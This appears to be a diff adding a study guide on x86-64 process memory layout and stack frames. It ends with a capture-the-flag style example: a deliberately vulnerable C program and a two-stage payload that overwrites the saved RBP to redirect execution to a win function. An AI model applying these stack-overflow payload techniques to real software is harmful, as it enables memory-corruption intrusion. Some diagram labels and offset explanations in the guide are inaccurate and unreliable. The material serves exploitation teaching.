@@ -1,0 +1,238 @@
+
+In a typical x86-64 process, memory is divided into the following regions (from low to high addresses):
+
++-----------------------------+ High Addresses (e.g., 0x7FFFFFFFFFFF)
+|      Kernel Space           |  <- Inaccessible to user space
++-----------------------------+
+|         Stack               |  <- Grows downward
+|                             |
+|    Function call frames     | 
+|  Local variables & return   | 
+|                             |
++-----------------------------+ <- Stack Base (e.g., 0x7FFFDABCD000)
+|   Memory-mapped Libraries   |  <- Shared libraries like libc
+|                             |     e.g., 0x7FFFF7A00000
+|   Dynamically linked libs   | 
++-----------------------------+
+|          Heap               |  <- Grows upward via `malloc`
+|  Dynamically allocated mem  |     e.g., 0x55555575A000
++-----------------------------+
+|   Uninitialized Data (.bss) |  <- Global/static vars (non-initialized)
+|                             |     e.g., 0x555555758000
++-----------------------------+
+|   Initialized Data (.data)  |  <- Global/static vars (initialized)
+|                             |     e.g., 0x555555757000
++-----------------------------+
+|    Read-only Data (.rodata) |  <- Constants, literals, etc.
+|                             |     e.g., 0x555555756000
++-----------------------------+
+|         Text (.text)        |  <- Executable machine instructions
+|                             |     e.g., 0x555555554000
++-----------------------------+ Low Addresses (e.g., 0x400000)
+
+1.Text Segment (.text):
+    ->Contains the program's executable instructions.
+    ->It is read-only and cannot be modified.
+    ->Example: main, add, and other user-defined functions live here.
+
+2. Read-Only Data Segment (.rodata):
+    ->Stores constants, string literals, etc.
+    ->Example: "Result: %d\n" for printf.
+
+3. Data Segment (.data):
+    ->Stores initialized global and static variables.
+    ->Example: int global_var = 5; resides here.
+
+4. BSS Segment (.bss):
+    ->Stores uninitialized global/static variables, initialized to 0 at runtime.
+    ->Example: int global_var; resides here.
+
+5. Heap Segment:
+    -> Dynamically allocated memory for the program.
+    -> Grows upward from the heap base address.
+    -> Managed by system calls like brk or mmap, and accessed via malloc or free.
+
+6. Stack:
+    -> Stores function call frames, including:
+        -> Return addresses
+        -> Local variables
+        -> Function arguments
+    -> Grows downward (toward lower memory addresses).
+    -> Controlled by RSP (stack pointer) and RBP (base pointer).
+
+7. Dynamically Linked Libraries (DLLs):
+    -> Dynamically linked libraries like libc are loaded above the heap and below the stack.
+    -> Provides functions like printf, malloc, etc.
+
+
+[+]-------------------------------------------------------------------------------------------------[+]
+ |                                                                                                   |
+ |                                            Stack and                                              |
+ |                                            Registers                                              |
+ |                                                                                                   |
+[+]-------------------------------------------------------------------------------------------------[+]
+
+The stack is a section of memory used for function calls, local variables, and control flow.
+
+It works in a last-in, first-out (LIFO) manner, meaning the last item pushed onto the stack is the first one popped off.
+
+The stack grows downwards in memory (toward lower addresses) on x86-64 systems.
+
+This means the "top" of the stack has the smallest address.
+ 
+Push more more items into the stack -> the stack pointer (RSP) decreases.
+
+Typical function prologue:
+
+push rbp          ; Save the caller's base pointer
+mov rbp, rsp      ; Set the base pointer to the current stack pointer
+sub rsp, N        ; Allocate space for local variables (N bytes)
+
+
+
+0xffffffffffffffff - Higher Addresses ON THE STACK ONLY
++------------------------------------+
+|                                    |
+|           Free Memory              |   <--- Unused Memory
+|                                    |
+|------------------------------------|
+|                                    |
+|      Function Prologue/Data        |   <--- RSP points here
+|------------------------------------|
+|                                    |
+|          Local Variables           |   <--- Allocated Space (sub rsp, N)
+|------------------------------------|
+|                                    |
+|               RBP                  |   <-- RBP now points here
+|------------------------------------|
+|                                    |
+|               RIP                  |   <-- Return Address (back to caller and saved during the call) 
+|------------------------------------|
+|                                    |
+|   Function arguments/Or nothing    |
+|------------------------------------|
+0x000000000000000 - Lower Addresse ON THE STACK ONLY
+
+Local variables are accessed relative to RBP using negative offsets:
+
+    -> mov rax, [rbp-8] retrieves the first local variable.
+    -> mov rax, [rbp+8] retrieves the first argument from a function.
+
+Example:
+
+0x7FFFFFFFFFFF - Higher Addresses
++------------------------------------+
+|                                    |
+|           Free Memory              |
+|                                    |
++------------------------------------+
+|  Local Variable 2 (e.g., y)        |   <- [rbp-16]
+|------------------------------------|
+|  Local Variable 1 (e.g., x)        |   <- [rbp-8]
+|------------------------------------|
+|  Saved RBP                         |   <- [rbp]
+|------------------------------------|
+|  Return Address (to caller)        |   <- [rbp+8]
+|------------------------------------|
+|  Function Argument 1 (e.g., a)     |   <- [rbp+16]
++------------------------------------+
+|  Lower Stack Data                  |
++------------------------------------+
+
+Typical function epiloque:
+
+mov rsp, rbp      ; Restore RSP to match RBP (remove local vars)
+pop rbp           ; Restore the caller’s base pointer
+ret               ; Return to caller
+
+Stack Layout After Epilogue:
+
+0x7FFFFFFFFFFF - Higher Addresses
++------------------------------------+
+|                                    |
+|           Free Memory              |   <- Unused space above stack
+|                                    |
++------------------------------------+
+|  Return Address (to caller)        |   <- RSP points here (ready to ret)
++------------------------------------+
+|  Lower Stack Data                  |
++------------------------------------+
+
+
+
+[+]-------------------------------------------------------------------------------------------------[+]
+ |                                                                                                   |
+ |                                            Attack vectors                                         |
+ |                                                 List                                              |
+ |                                                                                                   |
+[+]-------------------------------------------------------------------------------------------------[+]
+
+1. Classic Buffer Overflow
+
+Other guides cover this. This includes ret2win, ret2libc, ROP, ASLR, etc...
+
+1. RBP Manipulation
+
+An example of code subject to RBP manipulation is the following:
+
+[+]------------------------------------------------C------------------------------------------------[+]
+
+char buf[0x500]; // Wow so useful
+int state;
+char errorMsg[0x70];
+
+void win() {
+
+    if(state != 0xf1eeee2d){
+        puts("State is not the correct value!");
+        exit(1);
+    }
+    print_flag();
+}
+
+void vuln(){
+    char local_buf[0x20];
+    puts("Hey there, I'm deaddead. Who are you?");
+    fgets(local_buf, 0x30, stdin);
+}
+
+int main(){
+    state = 0xdeaddead;
+
+    setbuf(stdin, 0);
+	setbuf(stdout, 0);
+
+    vuln();
+    
+    return 0;
+}
+
+#state -> 0x404540
+#win -> 0x00000000004011d6
+#main -> 0x00000000004012eb
+#fgets on vuln -> 0x00000000004012d0
+
+[-]------------------------------------------------C------------------------------------------------[-]
+
+This has the classic buffer overflow where the buffer is size 0x20 but we can input 0x30 characters.
+The problem is I can't directly change the state variable since it's not on the same function stack frame as state.
+
+The solution lies in the fact that the RBP register is used to store the base pointer of the current stack frame,
+so we we would change the RBP to point close to the state, then call the vuln function again and NOW the state 
+variable is in the same stack frame as the vuln function, so we can change it.
+
+p.recvuntil(b"Who are you?\n")
+payload = flat(
+    b'A' * 0x20,
+    p64(0x404550), -> Very close to state
+    p64(0x00000000004012d0) -> vuln function again
+)
+payload2 = flat(
+    b'A'* (0x10 - 1),   -> Start of state
+    p64(0xf1eeee2d),
+    b'B'* 0x10,         -> Fill the buffer until the end of RBP
+    p64(0x00000000004011d6)  -> Win function
+)
+p.send(payload)
+p.send(payload2)
+p.interactive()
